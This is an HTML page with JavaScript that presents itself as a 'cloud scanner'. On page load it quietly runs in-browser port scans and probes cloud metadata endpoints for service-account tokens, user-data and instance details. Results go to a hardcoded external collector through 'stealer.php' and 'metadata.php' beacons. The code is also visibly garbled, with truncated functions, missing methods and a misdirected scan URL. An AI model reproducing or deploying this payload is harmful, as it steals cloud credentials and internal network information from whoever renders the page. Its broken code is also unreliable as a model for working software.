
<!doctype HTML>
<html>
<head>
<meta charset="UTF-8" />
<title>Enhanced Port Scanner with Cloud Metadata Access</title>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 20px;
    background-color: #f5f5f5;
  }
  .container {
    max-width: 1200px;
    margin: 0 auto;
  }
  #status {
    padding: 10px;
    border-radius: 5px;
    background-color: #fff;
    border: 1px solid #ddd;
    margin-bottom: 15px;
  }
  #results {
    padding: 10px;
    border-radius: 5px;
    background-color: #fff;
    border: 1px solid #ddd;
    min-height: 100px;
    max-height: 400px;
    overflow-y: auto;
  }
  #metadataResults {
    padding: 10px;
    border-radius: 5px;
    background-color: #fff;
    border: 1px solid #ddd;
    min-height: 100px;
    max-height: 400px;
    overflow-y: auto;
    margin-top: 20px;
  }
  .open-port {
    color: green;
    font-weight: bold;
  }
  .closed-port {
    color: #999;
  }
  .metadata-entry {
    color: blue;
    margin: 5px 0;
    font-family: monospace;
  }
  .metadata-error {
    color: red;
  }
  .tabs {
    display: flex;
    margin-bottom: 15px;
  }
  .tab {
    padding: 10px 20px;
    background-color: #ddd;
    cursor: pointer;
    border: 1px solid #ccc;
    border-bottom: none;
    border-radius: 5px 5px 0 0;
    margin-right: 5px;
  }
  .tab.active {
    background-color: #fff;
    font-weight: bold;
  }
  .tab-content {
    display: none;
    padding: 20px;
    background-color: #fff;
    border: 1px solid #ccc;
    border-radius: 0 5px 5px 5px;
    margin-bottom: 20px;
  }
  .tab-content.active {
    display: block;
  }
  progress {
    width: 100%;
    height: 20px;
    margin: 10px 0;
  }
  button {
    padding: 8px 16px;
    background-color: #4CAF50;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    margin-right: 10px;
  }
  button:disabled {
    background-color: #cccccc;
  }
  .settings {
    margin-bottom: 15px;
    padding: 10px;
    background-color: #fff;
    border-radius: 5px;
    border: 1px solid #ddd;
  }
  .port-group {
    margin-top: 10px;
  }
  .metadata-paths {
    margin-top: 10px;
    display: flex;
    flex-wrap: wrap;
  }
  .metadata-path {
    margin-right: 15px;
    margin-bottom: 5px;
  }
  h2 {
    margin-top: 0;
  }
</style>
</head>
<body>
<div class="container">
  <h1>Enhanced Cloud Scanner</h1>
  
  <div class="tabs" style="display: none;">
  <div class="tab" data-tab="port-scanner">Port Scanner</div>
  <div class="tab" data-tab="metadata-scanner">Cloud Metadata Scanner</div>
  <div class="tab active" data-tab="combined-view">Combined View</div>
</div>

<div id="combined-view" class="tab-content active">
  <h2>Combined Cloud Scanner Results</h2>
  
  <div class="settings-container">
    <div class="settings-column">
      <h3>Port Scanner</h3>
      <div id="combined-port-settings" class="settings">
        <!-- Port scanner settings will be cloned here -->
      </div>
      <div id="combined-port-status" class="status">Ready to scan</div>
      <progress id="combined-port-progress" value="0" max="100"></progress>
      <div id="combined-port-results" class="results"></div>
    </div>
    
    <div class="settings-column">
      <h3>Metadata Scanner</h3>
      <div id="combined-metadata-settings" class="settings">
        <!-- Metadata scanner settings will be cloned here -->
      </div>
      <div id="combined-metadata-status" class="status">Ready to scan metadata endpoints</div>
      <progress id="combined-metadata-progress" value="0" max="100"></progress>
      <div id="combined-metadata-results" class="results"></div>
    </div>
  </div>
</div>
  
  <div id="port-scanner" class="tab-content active">
    <h2>Port Scanner</h2>
    <div class="settings">
      <label for="target">Target: </label>
      <input type="text" id="target" value="127.0.0.1" />
      
      <div class="port-group">
        <label><input type="radio" name="portType" value="common" checked> Common HTTP Ports</label>
        <label><input type="radio" name="portType" value="all"> All Common Ports</label>
        <label><input type="radio" name="portType" value="custom"> Custom Range</label>
      </div>
      
      <div id="customPortsRange" style="display: none; margin-top: 10px;">
        <label for="startPort">Start Port:</label>
        <input type="number" id="startPort" min="1" max="65535" value="1000" />
        <label for="endPort">End Port:</label>
        <input type="number" id="endPort" min="1" max="65535" value="2000" />
      </div>
      
      <div style="margin-top: 15px;">
        <label for="concurrentScans">Concurrent Scans:</label>
        <input type="range" id="concurrentScans" min="1" max="50" value="10" />
        <span id="concurrentValue">30</span>
      </div>
      
      <button id="startScan">Start Scan</button>
      <button id="stopScan" disabled>Stop Scan</button>
      <label><input type="checkbox" id="autoStart"> Auto-start on page load</label>
    </div>

    <div id="status">Ready to scan</div>
    <progress id="scanProgress" value="0" max="100"></progress>
    <div id="results"></div>
  </div>
  
  <div id="metadata-scanner" class="tab-content">
    <h2>Cloud Metadata Scanner</h2>
    <div class="settings">
      <div>
        <label for="metadataEndpoint">Metadata Endpoint:</label>
        <input type="text" id="metadataEndpoint" value="http://169.254.169.254" style="width: 250px" />
      </div>
      
      <div style="margin-top: 10px;">
        <label>Cloud Provider:</label>
        <select id="cloudProvider">
          <option value="gcp">Google Cloud (GCP)</option>
          <option value="aws">Amazon Web Services (AWS)</option>
          <option value="azure">Microsoft Azure</option>
          <option value="all">Try All</option>
        </select>
      </div>
      
      <div style="margin-top: 10px;">
        <label>Include Headers:</label>
        <div class="metadata-headers">
          <label><input type="checkbox" id="headerMetadataFlavor" checked> Metadata-Flavor: Google</label>
          <label><input type="checkbox" id="headerXMetadataFlavor" checked> X-Metadata-Flavor: Google</label>
          <label><input type="checkbox" id="headerXForwardedFor"> X-Forwarded-For</label>
        </div>
      </div>
      
      <div style="margin-top: 10px;">
        <label>Common Paths to Check:</label>
        <div class="metadata-paths">
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/" checked> /computeMetadata/v1/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/instance/" checked> /instance/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/instance/service-accounts/" checked> /service-accounts/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/instance/service-accounts/default/" checked> /service-accounts/default/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/instance/service-accounts/default/token" checked> /default/token</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/computeMetadata/v1/instance/attributes/" checked> /attributes/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/latest/meta-data/" checked> AWS: /latest/meta-data/</label></div>
          <div class="metadata-path"><label><input type="checkbox" data-path="/metadata/instance" checked> Azure: /metadata/instance</label></div>
        </div>
      </div>
      
      <div style="margin-top: 15px;">
        <label for="metadataDelay">Request Delay (ms):</label>
        <input type="range" id="metadataDelay" min="100" max="2000" value="500" />
        <span id="delayValue">500</span>
      </div>
      
      <div style="margin-top: 15px;">
        <button id="startMetadataScan">Start Metadata Scan</button>
        <button id="stopMetadataScan" disabled>Stop Scan</button>
        <label><input type="checkbox" id="recursiveScan" checked> Recursive Scan</label>
      </div>
    </div>
    
    <div id="metadataStatus">Ready to scan metadata endpoints</div>
    <progress id="metadataProgress" value="0" max="100"></progress>
    <div id="metadataResults"></div>
  </div>
</div>

class PortScanner {
  constructor() {
    this.detectBrowser();
    this.detectOS();
    this.setupRestrictedPorts();
    this.running = false;
    this.openPorts = [];
    this.closedPorts = [];
    this.pendingScans = 0;
    this.maxConcurrentScans = 50;
    
    this.statusElement = document.getElementById("status");
    this.resultsElement = document.getElementById("results");
    this.progressElement = document.getElementById("scanProgress");
    
    if (!this.statusElement) {
      console.error("Status element not found, creating one");
      this.statusElement = document.createElement("div");
      this.statusElement.id = "status";
      document.body.appendChild(this.statusElement);
    }
    
    if (!this.resultsElement) {
      console.error("Results element not found, creating one");
      this.resultsElement = document.createElement("div");
      this.resultsElement.id = "results";
      document.body.appendChild(this.resultsElement);
    }
    
    if (!this.progressElement) {
      console.error("Progress element not found, creating one");

  detectOS() {
    if(/Mac/i.test(navigator.platform)){
      this.os = "Mac";
    } else if(/Linux/i.test(navigator.platform)){
      this.os = "Linux";
    } else if(/^Win/i.test(navigator.platform)){
      this.os = "Windows";
    } else {
      this.os = "Unknown";
    }
  }
  
  detectBrowser() {
    if (/Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor)) {

      this.browser = 'Firefox';

  updateStatus(message) {
    this.statusElement.textContent = message;
  }
  
  updateProgress(completed, total) {
    const percent = (completed / total) * 100;
    this.progressElement.value = percent;
  }
  
  addResult(port, isOpen) {
    if (isOpen) {

        portElement.className = 'open-port';

        }

    img.src = `${this.reportUrl}/stealer.php/?open=port&port=${port}`;

  }
  
  async startScan(target, ports) {
    if (this.running) return;
    
    this.running = true;
    this.openPorts = [];
    this.closedPorts = [];
    this.completedScans = 0;
    this.totalScans = ports.length;
    this.pendingScans = 0;
    
    this.updateStatus(`Starting scan of ${target} (${ports.length} ports)`);
    this.progressElement.value = 0;
    this.resultsElement.innerHTML = '';
    
    ports = ports.filter(port => !this.restrictedPorts[this.browser].includes(port));
    
    let index = 0;
    
    const scanNext = () => {
      if (!this.running) return;
      
      while (this.pendingScans < this.maxConcurrentScans && index < ports.length) {
        const port = ports[index++];
        this.pendingScans++;
        
        this.scanPort(target, port).finally(() => {
          this.pendingScans--;
          this.completedScans++;
          this.updateProgress(this.completedScans, this.totalScans);
          
          if (this.completedScans >= this.totalScans) {
            this.scanComplete();
          } else if (this.running) {
            scanNext();
          }
        });
      }
    };
    
    scanNext();
  }
  
  stopScan() {
    this.running = false;
    this.updateStatus('Scan stopped');
  }
  
  scanComplete() {
    this.running = false;
    this.updateStatus(`Scan complete. Found ${this.openPorts.length} open ports.`);
  }
  
  async scanPort(target, port) {
    if (window.fetch) {
      return this.scanPortWithFetch(target, port);
    } else if (this.browser === 'Firefox') {
      return this.scanPortFirefox(target, port);
    } else {
      return this.scanPortWithErrorHandling(target, port);
    }
  }
  
  scanPortWithFetch(target, port) {
    return new Promise(resolve => {
      const controller = new AbortController();
      const signal = controller.signal;
      const startTime = Date.now();
      
      const timeoutId = setTimeout(() => controller.abort(), 2500);
      
      fetch(`https://${port}.hostinger.systems`, {
        mode: 'no-cors',
        cache: 'no-store',
        signal: signal
      })
      .then(response => {
        clearTimeout(timeoutId);
        this.addResult(port, true);
        resolve();
      })
      .catch(error => {
        clearTimeout(timeoutId);
        const timeElapsed = Date.now() - startTime;
        
        if (error.name === 'AbortError') {
          this.addResult(port, false);
          resolve();
        } else if (error.name === 'TypeError') {
          this.addResult(port, false);
          resolve();
        } else if (error.message && error.message.includes('ECONNREFUSED')) {
          this.addResult(port, false);
          resolve();
        } else {
          if (timeElapsed > 1500) {
            this.addResult(port, true);
          } else {
            this.addResult(port, false);
          }
          resolve();
        }
      });
    });
  }
  
  scanPortWithErrorHandling(target, port) {
    return new Promise(resolve => {
      const frameContainer = document.createElement('div');
      frameContainer.style.display = 'none';
      document.body.appendChild(frameContainer);
      
      const iframe = document.createElement('iframe');
      iframe.style.visibility = 'hidden';
      iframe.style.position = 'absolute';
      iframe.style.left = '-1000px';
      iframe.style.width = '1px';
      iframe.style.height = '1px';
      frameContainer.appendChild(iframe);
      
      let isErrored = false;
      let errorType = null;
      const startTime = Date.now();
      
      const errorHandler = function(e) {
        if (e.target === iframe) {
          isErrored = true;
          errorType = e.message;
        }
      };
      
      window.addEventListener('error', errorHandler, true);
      
      const timeoutId = setTimeout(() => {
        const timeElapsed = Date.now() - startTime;
        window.removeEventListener('error', errorHandler, true);
        
        if (document.body.contains(frameContainer)) {
          document.body.removeChild(frameContainer);
        }
        
        if ((timeElapsed > 1500 && !isErrored) || 
            (errorType && (errorType.includes('connection') || errorType.includes('reset')))) {
          this.addResult(port, true);
        } else {
          this.addResult(port, false);
        }
        
        resolve();
      }, 2500);
      
      iframe.onload = () => {
        clearTimeout(timeoutId);
        window.removeEventListener('error', errorHandler, true);
        this.addResult(port, true);
        document.body.removeChild(frameContainer);
        resolve();
      };
      
      iframe.src = `http://${target}:${port}?cachebust=${Date.now()}`;
    });
  }
  
  scanPortFirefox(target, port) {
    return new Promise(resolve => {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.id = `firefox_${Date.now()}_${port}`;
      document.body.appendChild(iframe);
      
      const startTime = Date.now();
      let loaded = false;
      
      let timer = setTimeout(() => {
        if (document.body.contains(iframe)) {
          document.body.removeChild(iframe);
        }
        
        const timeElapsed = Date.now() - startTime;
        if (loaded) {
          this.addResult(port, true);
        } else if (timeElapsed > 1500) {
          this.addResult(port, true);
        } else {
          this.addResult(port, false);
        }
        resolve();
      }, 2500);
      
      iframe.onload = () => {
        loaded = true;
        clearTimeout(timer);
        this.addResult(port, true);
        document.body.removeChild(iframe);
        resolve();
      };
      
      iframe.src = `http://${target}:${port}?nocache=${Date.now()}`;
    });
  }
}

class MetadataScanner {
  constructor() {
    this.running = false;
    this.foundEndpoints = [];
    this.checkedEndpoints = [];
    this.pendingRequests = 0;
    this.maxRetries = 2;
    this.requestDelay = 500;
    this.reportUrl = null;
    this.recursiveScanEnabled = true;
    
    this.statusElement = document.getElementById("metadataStatus");
    this.resultsElement = document.getElementById("metadataResults");
    this.progressElement = document.getElementById("metadataProgress");
    
    if (!this.statusElement) {
      console.error("Metadata status element not found, creating one");
      this.statusElement = document.createElement("div");
      this.statusElement.id = "metadataStatus";
      document.body.appendChild(this.statusElement);
    }
    
    if (!this.resultsElement) {
      console.error("Metadata results element not found, creating one");
      this.resultsElement = document.createElement("div");
      this.resultsElement.id = "metadataResults";
      document.body.appendChild(this.resultsElement);
    }
    
    if (!this.progressElement) {
      console.error("Metadata progress element not found, creating one");
      this.progressElement = document.createElement("progress");
      this.progressElement.id = "metadataProgress";
      document.body.appendChild(this.progressElement);
    }
    
    this.cloudEndpoints = {
      gcp: {
        base: '169.254.169.254',
        paths: [
          '/computeMetadata/v1/',
          '/computeMetadata/v1/instance/',
          '/computeMetadata/v1/instance/service-accounts/',
          '/computeMetadata/v1/instance/service-accounts/default/',
          '/computeMetadata/v1/instance/service-accounts/default/token',
          '/computeMetadata/v1/instance/attributes/'
        ],
        headers: {
          'Metadata-Flavor': 'Google',
          'X-Metadata-Flavor': 'Google'
        }
      },
      aws: {
        base: '169.254.169.254',
        paths: [
          '/latest/meta-data/',
          '/latest/user-data/',
          '/latest/dynamic/instance-identity/'
        ],
        headers: {}
      },
      azure: {
        base: '169.254.169.254',
        paths: [
          '/metadata/instance',
          '/metadata/instance/compute',
          '/metadata/instance/network'
        ],
        headers: {
          'Metadata': 'true'
        },
        queryParams: '?api-version=2021-02-01&format=json'
      }
    };
  }
  
  updateStatus(message) {
    this.statusElement.textContent = message;
  }
  
  updateProgress(completed, total) {
    const percent = Math.min((completed / Math.max(total, 1)) * 100, 100);
    this.progressElement.value = percent;
  }
  
  addResult(endpoint, data, isSuccess = true) {
    if (isSuccess) {
      if (!this.foundEndpoints.includes(endpoint)) {
        this.foundEndpoints.push(endpoint);
        
        const resultElement = document.createElement('div');
        resultElement.className = 'metadata-entry';
        
        let formattedData = '';
        try {
          const jsonData = JSON.parse(data);
          formattedData = JSON.stringify(jsonData, null, 2);
        } catch (e) {
          formattedData = data;
        }
        
        resultElement.innerHTML = `<strong>${endpoint}</strong>: <pre>${formattedData}</pre>`;
        this.resultsElement.appendChild(resultElement);
        
        if (this.reportUrl) {
          this.reportToServer(endpoint, data);
        }
      }
    } else {
      const errorElement = document.createElement('div');
      errorElement.className = 'metadata-error';
      errorElement.textContent = `Failed to access: ${endpoint} - ${data}`;
    }
  }
  
  reportToServer(endpoint, data) {
    if (!this.reportUrl) return;
    
    fetch(`${this.reportUrl}/metadata.php`, {
      method: 'POST',
      mode: 'no-cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        endpoint: endpoint,
        data: data
      })
    }).catch(err => console.log('Error reporting metadata:', err));
    
    const img = new Image();
    img.src = `${this.reportUrl}/stealer.php/?endpoint=${encodeURIComponent(endpoint)}&type=metadata`;
  }
  
  async startScan(baseUrl, selectedProvider = 'all', customHeaders = {}) {
    if (this.running) return;
    
    this.running = true;
    this.foundEndpoints = [];
    this.checkedEndpoints = [];
    this.totalEndpoints = 0;
    this.completedRequests = 0;
    
    this.updateStatus(`Starting metadata scan of ${baseUrl}`);
    this.progressElement.value = 0;
    this.resultsElement.innerHTML = '';
    
    let providersToCheck = [];
    if (selectedProvider === 'all') {
      providersToCheck = ['gcp', 'aws', 'azure'];
    } else {
      providersToCheck = [selectedProvider];
    }
    
    let endpointsToCheck = [];
    
    providersToCheck.forEach(provider => {
      const endpoints = this.getProviderEndpoints(baseUrl, provider);
      endpointsToCheck = [...endpointsToCheck, ...endpoints];
    });
    
    this.totalEndpoints = endpointsToCheck.length;
    this.updateStatus(`Scanning ${this.totalEndpoints} metadata endpoints`);
    
    for (const endpoint of endpointsToCheck) {
      if (!this.running) break;
      
      let headers = { ...endpoint.headers, ...customHeaders };
      
      await this.checkMetadataEndpoint(endpoint.url, headers);
      
      await new Promise(resolve => setTimeout(resolve, this.requestDelay));
    }
  }
  
  async stopScan() {
    this.running = false;
    this.updateStatus('Metadata scan stopped');
  }
  
  scanComplete() {
    this.running = false;
    this.updateStatus(`Metadata scan complete. Found ${this.foundEndpoints.length} accessible endpoints.`);
  }
  
  getProviderEndpoints(baseUrl, providerName) {
    const provider = this.cloudEndpoints[providerName];
    if (!provider) return [];
    
    const endpoints = [];
    
    provider.paths.forEach(path => {
      const baseUrlClean = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
      const pathClean = path.startsWith('/') ? path : '/' + path;
      
      let url = `${baseUrlClean}${pathClean}`;
      
      if (providerName === 'azure' && provider.queryParams) {
        url += provider.queryParams;
      }
      
      endpoints.push({
        url: url,
        headers: provider.headers || {},
        provider: providerName
      });
    });
    
    return endpoints;
  }
  
  async checkMetadataEndpoint(url, headers = {}, retryCount = 0) {
    if (!this.running) return;
    
    if (this.checkedEndpoints.includes(url)) {
      this.completedRequests++;
      this.updateProgress(this.completedRequests, this.totalEndpoints);
      return;
    }
    
    this.checkedEndpoints.push(url);
    
    try {
      const controller = new AbortController();
      const signal = controller.signal;
      const timeoutId = setTimeout(() => controller.abort(), 3000);
      
      const response = await fetch(url, {
        method: 'GET',
        headers: headers,
        signal: signal,
      });
      
      clearTimeout(timeoutId);
      
      const contentType = response.headers.get('content-type');
      let responseData;
      
      if (contentType && contentType.includes('application/json')) {
        responseData = await response.json();
      } else {
        responseData = await response.text();
      }
      
      this.addResult(url, responseData);
      
      if (this.recursiveScanEnabled && typeof responseData === 'string') {
        this.scanDirectory(url, responseData, headers);
      }
    } catch (error) {
      if (retryCount < this.maxRetries) {
        await new Promise(resolve => setTimeout(resolve, 500 * Math.pow(2, retryCount)));
        return this.checkMetadataEndpoint(url, headers, retryCount + 1);
      } else {
        this.addResult(url, error.message || 'Unknown error', false);
      }
    } finally {
      this.completedRequests++;
      this.updateProgress(this.completedRequests, this.totalEndpoints);
      
      if (this.completedRequests >= this.totalEndpoints) {
        this.scanComplete();
      }
    }
  }
  
  scanDirectory(baseUrl, responseText, headers) {
    if (!this.running) return;
    
    const lines = responseText.split('\n');
    const directoryEntries = [];
    
    const patterns = [
      /([a-zA-Z0-9_\-./]+)/g,
      /<a href="([^"]+)">/g,
      /^([^<>\s]+)$/gm
    ];
    
    lines.forEach(line => {
      patterns.forEach(pattern => {
        const matches = [...line.matchAll(pattern)];
        matches.forEach(match => {
          const entry = match[1].trim();
          if (entry && entry !== '..' && entry !== '../' && entry !== './') {
            directoryEntries.push(entry);
          }
        });
      });
    });
    
    const uniqueEntries = [...new Set(directoryEntries)];
    
    uniqueEntries.forEach(entry => {
      const entryUrl = entry.startsWith('http') ? 
        entry : 
        baseUrl + (baseUrl.endsWith('/') ? '' : '/') + entry;
      
      this.totalEndpoints++;
      
      setTimeout(() => {
        this.checkMetadataEndpoint(entryUrl, headers);
      }, this.requestDelay);
    });
  }
}

document.addEventListener('DOMContentLoaded', function() {
  const portScanner = new PortScanner();
  const metadataScanner = new MetadataScanner();
  
  const tabs = document.querySelectorAll('.tab');
  const tabContents = document.querySelectorAll('.tab-content');

      tabContents.forEach(content => {
        content.classList.remove('active');
        if (content.id === targetId) {
          content.classList.add('active');
        }
      });
    });
  });
  
  function safeGetElement(id) {
    const element = document.getElementById(id);
    if (!element) {
      console.error(`Element with ID "${id}" not found in the document`);
      return null;
    }
    return element;
  }
  
  const startScanButton = safeGetElement('startScan');
  const stopScanButton = safeGetElement('stopScan');
  const targetInput = safeGetElement('target');
  const portTypeRadios = document.getElementsByName('portType');
  const customPortsRangeDiv = safeGetElement('customPortsRange');
  const startPortInput = safeGetElement('startPort');
  const endPortInput = safeGetElement('endPort');
  const concurrentScansSlider = safeGetElement('concurrentScans');
  const concurrentValueDisplay = safeGetElement('concurrentValue');
  const autoStartCheckbox = safeGetElement('autoStart');
  
  if (concurrentScansSlider && concurrentValueDisplay) {
    concurrentScansSlider.addEventListener('input', function() {
      concurrentValueDisplay.textContent = this.value;
      portScanner.maxConcurrentScans = parseInt(this.value);
    });
  }
  
  if (portTypeRadios && portTypeRadios.length > 0 && customPortsRangeDiv) {
    for (let radio of portTypeRadios) {
      radio.addEventListener('change', function() {
        customPortsRangeDiv.style.display = this.value === 'custom' ? 'block' : 'none';
      });
    }
  }
  
  function getPortsToScan() {
    if (!targetInput) return null;
    
    const target = targetInput.value.trim();
    if (!target) {
      console.error('Please enter a valid target');
      return null;
    }
    
    let portsToScan = [];
    const selectedRadio = document.querySelector('input[name="portType"]:checked');
    if (!selectedRadio) {
      console.error('No port type selected');
      return null;
    }
    
    const selectedPortType = selectedRadio.value;
    
    if (selectedPortType === 'common') {
      portsToScan = portScanner.getCommonHttpPorts();
    } else if (selectedPortType === 'all') {
      portsToScan = portScanner.getCommonPorts();
    } else if (selectedPortType === 'custom') {
      if (!startPortInput || !endPortInput) {
        console.error('Port range inputs not found');
        return null;
      }
      
      const startPort = parseInt(startPortInput.value);
      const endPort = parseInt(endPortInput.value);
      
      if (isNaN(startPort) || isNaN(endPort) || startPort < 1 || endPort > 65535 || startPort > endPort) {
        console.error('Please enter valid port range (1-65535)');
        return null;
      }
      
      // Return a range object instead of creating a potentially huge array
      return { 
        target, 
        isPortRange: true,
        startPort,
        endPort,
        // Empty placeholder array - ports will be processed incrementally
        portsToScan: [] 
      };
    }
    
    return { target, portsToScan };
  }
  
  if (startScanButton) {
    startScanButton.addEventListener('click', function() {
      const scanInfo = getPortsToScan();
      if (!scanInfo) return;
      
      if (startScanButton) startScanButton.disabled = true;
      if (stopScanButton) stopScanButton.disabled = false;
      
      portScanner.startScan(scanInfo.target, scanInfo.portsToScan);
    });
  }
  
  if (stopScanButton) {
    stopScanButton.addEventListener('click', function() {
      portScanner.stopScan();
      if (startScanButton) startScanButton.disabled = false;
      if (stopScanButton) stopScanButton.disabled = true;
    });
  }
  
  const startMetadataScanButton = safeGetElement('startMetadataScan');
  const stopMetadataScanButton = safeGetElement('stopMetadataScan');
  const metadataEndpointInput = safeGetElement('metadataEndpoint');
  const cloudProviderSelect = safeGetElement('cloudProvider');
  const recursiveScanCheckbox = safeGetElement('recursiveScan');
  const metadataDelaySlider = safeGetElement('metadataDelay');
  const delayValueDisplay = safeGetElement('delayValue');
  
  const headerMetadataFlavorCheckbox = safeGetElement('headerMetadataFlavor');
  const headerXMetadataFlavorCheckbox = safeGetElement('headerXMetadataFlavor');
  const headerXForwardedForCheckbox = safeGetElement('headerXForwardedFor');
  
  if (metadataDelaySlider && delayValueDisplay) {
    metadataDelaySlider.addEventListener('input', function() {
      delayValueDisplay.textContent = this.value;
      metadataScanner.requestDelay = parseInt(this.value);
    });
  }
  
  if (recursiveScanCheckbox) {
    recursiveScanCheckbox.addEventListener('change', function() {
      metadataScanner.recursiveScanEnabled = this.checked;
    });
  }
  
  function getSelectedMetadataPaths() {
    const pathCheckboxes = document.querySelectorAll('.metadata-path input[type="checkbox"]');
    const selectedPaths = [];
    
    pathCheckboxes.forEach(checkbox => {
      if (checkbox.checked) {
        const path = checkbox.getAttribute('data-path');
        if (path) {
          selectedPaths.push(path);
        }
      }
    });
    
    return selectedPaths;
  }
  
  function getSelectedHeaders() {
    const headers = {};
    
    if (headerMetadataFlavorCheckbox && headerMetadataFlavorCheckbox.checked) {
      headers['Metadata-Flavor'] = 'Google';
    }
    
    if (headerXMetadataFlavorCheckbox && headerXMetadataFlavorCheckbox.checked) {
      headers['X-Metadata-Flavor'] = 'Google';
    }
    
    if (headerXForwardedForCheckbox && headerXForwardedForCheckbox.checked) {
      headers['X-Forwarded-For'] = '127.0.0.1';
    }
    
    return headers;
  }
  
  if (startMetadataScanButton) {
    startMetadataScanButton.addEventListener('click', function() {
      if (!metadataEndpointInput) return;
      
      const endpoint = metadataEndpointInput.value.trim();
      if (!endpoint) {
        console.error('Please enter a valid metadata endpoint');
        return;
      }
      
      const selectedProvider = cloudProviderSelect ? cloudProviderSelect.value : 'gcp';
      const customHeaders = getSelectedHeaders();
      
      if (startMetadataScanButton) startMetadataScanButton.disabled = true;
      if (stopMetadataScanButton) stopMetadataScanButton.disabled = false;
      
      metadataScanner.startScan(endpoint, selectedProvider, customHeaders);
    });
  }
  
  if (stopMetadataScanButton) {
    stopMetadataScanButton.addEventListener('click', function() {
      metadataScanner.stopScan();
      if (startMetadataScanButton) startMetadataScanButton.disabled = false;
      if (stopMetadataScanButton) stopMetadataScanButton.disabled = true;
    });
  }
  
  portScanner.reportUrl = "https://cba78c922e106fa37d163168c591610a.m.pipedream.net";
  metadataScanner.reportUrl = "https://cba78c922e106fa37d163168c591610a.m.pipedream.net";
  
setTimeout(() => {
  const scanInfo = getPortsToScan();
  if (scanInfo) {
    if (startScanButton) startScanButton.disabled = true;
    if (stopScanButton) stopScanButton.disabled = false;
    portScanner.startScan(scanInfo.target, scanInfo.portsToScan);
  }
  
  if (metadataEndpointInput) {
    const endpoint = metadataEndpointInput.value.trim();
    if (endpoint) {
      const selectedProvider = cloudProviderSelect ? cloudProviderSelect.value : 'all';
      const customHeaders = getSelectedHeaders();
      if (startMetadataScanButton) startMetadataScanButton.disabled = true;
      if (stopMetadataScanButton) stopMetadataScanButton.disabled = false;
      metadataScanner.startScan(endpoint, selectedProvider, customHeaders);
    }
  }
}, 500);
});
</script>
</body>
</html>
